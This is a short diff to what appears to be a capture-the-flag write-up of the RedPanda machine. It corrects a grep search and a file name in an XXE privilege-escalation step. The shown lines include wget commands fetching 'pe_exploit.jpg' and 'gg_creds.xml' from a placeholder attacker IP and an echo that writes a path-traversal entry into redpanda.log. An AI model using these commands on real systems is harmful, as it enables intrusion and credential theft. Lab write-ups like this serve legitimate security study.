@@ -124,7 +124,7 @@ This gives us a source code directory (maybe some nice config info) and user XML
 
 ```
 cd /opt/panda_search
-find . -type f -exec grep -H 'text-to-find-here' {} \;
+find . -type f -exec grep -H 'woodenk' {} \;
 ```
 
 This gives mysql connection info and 'woodenk' embedded in some images  
@@ -177,7 +177,7 @@ XXE.2 Create `gg_creds.xml` with the following content
 XXE.3 upload files and modify the redpanda.log
 ```
 wget 10.10.ATTACKER.IP/pe_exploit.jpg -P /tmp
-wget 10.10.ATTACKER.IP/gg_creds.jpg -P /tmp
+wget 10.10.ATTACKER.IP/gg_creds.xml -P /tmp
 echo "222||a||a||/../../../../../../tmp/pe_exploit.jpg" > /opt/panda_search/redpanda.log
 ```
 
